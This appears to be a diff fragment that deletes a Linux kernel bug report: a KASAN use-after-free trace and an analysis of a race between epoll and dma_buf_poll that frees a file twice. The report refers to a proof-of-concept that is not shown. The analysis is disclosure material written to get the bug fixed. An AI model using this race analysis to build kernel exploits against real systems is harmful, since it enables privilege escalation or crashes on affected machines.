-  d_alloc_pseudo+0x14/0x8d
-  alloc_path_pseudo+0xa5/0x165
-  alloc_file_pseudo+0x7f/0x124
-  dma_buf_export+0x37f/0x894
-  udmabuf_create+0x53e/0x68c
-  udmabuf_ioctl+0x133/0x212
-  vfs_ioctl+0x7e/0x95
-  __do_sys_ioctl+0x51/0x78
-  do_syscall_64+0x9b/0x107
-  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-
-Freed by task 403:
-  kasan_save_stack+0x24/0x44
-  kasan_save_track+0x14/0x2d
-  kasan_save_free_info+0x3f/0x4d
-  poison_slab_object+0xcb/0xd8
-  __kasan_slab_free+0x19/0x38
-  kmem_cache_free+0xd6/0x136
-  __dentry_kill+0x22d/0x321
-  dput+0x3b/0x7f
-  __fput+0x4f1/0x523
-  __do_sys_close+0x59/0x87
-  do_syscall_64+0x9b/0x107
-  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-
-The buggy address belongs to the object at ffff88800051e800
-  which belongs to the cache dentry of size 192
-The buggy address is located 48 bytes inside of
-  freed 192-byte region [ffff88800051e800, ffff88800051e8c0)
-
-The buggy address belongs to the physical page:
-page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x51e
-flags: 0x800(slab|zone=0)
-page_type: 0xffffffff()
-raw: 0000000000000800 ffff888000281780 ffffea0000013ec0 0000000000000002
-raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
-page dumped because: kasan: bad access detected
-
-Memory state around the buggy address:
-  ffff88800051e700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  ffff88800051e780: 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc fc
- >ffff88800051e800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-                                      ^
-  ffff88800051e880: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
-  ffff88800051e900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-==================================================================
-
-Root cause:
-AFAIK, eventpoll (epoll) does not increase the registered file's reference.
-To ensure the safety, when the registered file is deallocated in __fput,
-eventpoll_release is called to unregister the file from epoll. When calling
-poll on epoll, epoll will loop through registered files and call vfs_poll on
-these files. In the file's poll, file is guaranteed to be alive, however, as
-epoll does not increase the registered file's reference, the file may be 
-dying
-and it's not safe the get the file for later use. And dma_buf_poll violates
-this. In the dma_buf_poll, it tries to get_file to use in the callback. This
-leads to a race where the dmabuf->file can be fput twice.
-
-Here is the race occurs in the above proof-of-concept
-
-close(dmabuf->file)
-__fput_sync (f_count == 1, last ref)
-f_count-- (f_count == 0 now)
-__fput
-                                     epoll_wait
-                                     vfs_poll(dmabuf->file)
-                                     get_file(dmabuf->file)(f_count == 1)
-eventpoll_release
-dmabuf->file deallocation
-                                     fput(dmabuf->file) (f_count == 1)
-                                     f_count--
-                                     dmabuf->file deallocation
-
-I am not familiar with the dma_buf so I don't know the proper fix for the
-issue. About the rule that don't get the file for later use in poll 
-callback of
-file, I wonder if it is there when only select/poll exist or just after 
-epoll
-appears.
-
-I hope the analysis helps us to fix the issue.
-
-Thanks,
-Quang Minh.
+Thanks!
+Quentin
